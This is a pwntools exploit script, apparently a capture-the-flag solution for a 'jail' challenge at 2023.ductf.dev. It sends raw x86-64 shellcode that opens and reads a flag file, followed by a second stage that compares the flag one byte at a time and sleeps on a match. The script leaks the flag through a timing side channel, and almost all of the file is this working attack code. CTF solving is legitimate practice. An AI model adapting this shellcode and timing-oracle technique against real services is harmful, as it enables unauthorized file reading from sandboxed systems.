from pwn import * 
import signal

exe = ELF("jail")

context.arch= 'amd64'
printable_start = 33
printable_end = 125
current_char = 32 
index = 0 

def timeout_handler(signum, frame):
    raise TimeoutError("Timeout occurred.")

flag = ""
shellcode1 = b'\x49\x89\xd6\x48\xb8\x61\x67\x2e\x74\x78\x74\x00\x00\x50\x48\xb8\x2f\x63\x68\x61\x6c\x2f\x66\x6c\x50\x48\xc7\xc0\x01\x01\x00\x00\x48\xbf\x9c\xff\xff\xff\xff\xff\xff\xff\x48\x31\xd2\x48\x89\xe6\x0f\x05\x48\x8d\xac\x24\x00\xfe\xff\xff\x48\x89\xc7\x48\x8d\xb5\xb0\xfd\xff\xff\x48\xc7\xc2\x50\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x00\x00\x00\x00\x4c\x89\xf6\x48\xc7\xc2\x55\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x41\xff\xd6'

shellcode_index_0_1 = b'L\x8d\xa5\xb0\xfd\xff\xffM\x8d\x04$M1\xc9M1\xd2E\x8a\x08A\xb2'
shellcode_index_0_2 = b'M)\xd1I\x83\xf9\x00u(H\x83\xec\x10H\x89\xe7H1\xc0H\xc7\xc2\x00\x945wH\x89G\x08H\x89W\x10H\xc7\xc0#\x00\x00\x00H\x89\xe7H1\xf6\x0f\x05H\xc7\xc0<\x00\x00\x00\x0f\x05'
other_1 = b'L\x8d\xa5\xb0\xfd\xff\xffM\x8dD$'
other_2 = b'M1\xc9M1\xd2E\x8a\x08A\xb2'
other_3 =b'M)\xd1I\x83\xf9\x00u(H\x83\xec\x10H\x89\xe7H1\xc0H\xc7\xc2\x00\x945wH\x89G\x08H\x89W\x10H\xc7\xc0\x23\x00\x00\x00H\x89\xe7H1\xf6\x0f\x05H\xc7\xc0<\x00\x00\x00\x0f\x05'
for i in range(0,0x20):
	try:
		while current_char <= printable_end:
			current_char +=1
			print("trying: ",chr(current_char))
			print("index: " ,index)
			print("current flag: ",flag)
			signal.alarm(0)
			p = remote("2023.ductf.dev",30010)
			#p = process(exe.path)
			# gdb.attach(p,
			# """
			# b*main+197
			# c
			# """)
			#input()
			signal.signal(signal.SIGALRM, timeout_handler)
			signal.alarm(6)
			payload = shellcode1
			p.sendlineafter(b'> ',payload)
			if index == 0:
				payload = shellcode_index_0_1 + chr(current_char).encode('latin')+shellcode_index_0_2
				p.sendline(payload)
			else :
				payload = other_1 + chr(index).encode('latin') + other_2 + chr(current_char).encode('latin')+other_3
				p.sendline(payload)
			p.interactive()
	except TimeoutError :
		flag += chr(current_char)
		print("--------->>>>>>CURRENT FLAG: ",flag)
		index +=1 
		current_char = printable_start 
	except EOFError:
		print("NOT THIS TIME")